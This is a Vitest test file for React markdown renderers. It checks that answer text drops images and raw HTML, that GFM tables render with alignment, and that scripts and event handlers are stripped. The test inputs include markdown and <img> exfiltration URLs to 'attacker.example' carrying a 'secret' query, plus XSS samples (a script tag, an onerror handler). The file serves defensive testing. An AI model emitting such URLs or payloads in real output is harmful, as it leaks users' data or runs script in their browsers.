import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { AnswerMarkdown, ReaderMarkdown } from './reader-markdown.tsx';

describe('AnswerMarkdown', () => {
  it('답에 든 이미지와 HTML은 그리지 않아, 화면을 열기만 해도 바깥으로 요청이 나가는 일이 없다 (ADR-0015)', () => {
    const markdown = ['요약입니다.', '![x](https://attacker.example/?q=secret)', '<img src="https://attacker.example/raw">', '[링크](https://example.com)'].join('\n\n');
    const html = renderToStaticMarkup(createElement(AnswerMarkdown, { markdown }));
    expect(html).not.toContain('attacker.example');
    expect(html).not.toContain('<img');
    expect(html).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">링크</a>');
  });
});

describe('ReaderMarkdown', () => {
  it('GFM 표를 헤더·행·열이 있는 table로 그린다', () => {
    const markdown = ['| 순위 | 웹 방문 수 |', '| --- | --- |', '| 1 | ChatGPT |', '| 2 | Gemini |'].join('\n');
    const html = renderToStaticMarkup(createElement(ReaderMarkdown, { markdown }));
    expect(html).toContain('<table>');
    expect(html).toContain('<th>순위</th>');
    expect(html).toContain('<td>ChatGPT</td>');
    expect(html.match(/<tr>/g)).toHaveLength(3);
    expect(html).not.toContain('| --- |');
  });

  it('표 셀의 정렬 지정을 살린다', () => {
    const markdown = ['| 이름 | 수 |', '| :--- | ---: |', '| a | 1 |'].join('\n');
    const html = renderToStaticMarkup(createElement(ReaderMarkdown, { markdown }));
    expect(html).toContain('<th style="text-align:left">이름</th>');
    expect(html).toContain('<td style="text-align:right">1</td>');
  });

  it('GFM을 켜도 원문 HTML의 스크립트·이벤트 속성은 걸러낸다 (ADR-0011)', () => {
    const markdown = ['<script>alert(1)</script>', '<img src="https://example.com/a.png" onerror="alert(1)">', '| a |\n| --- |\n| b |'].join('\n\n');
    const html = renderToStaticMarkup(createElement(ReaderMarkdown, { markdown }));
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).toContain('<table>');
  });
});
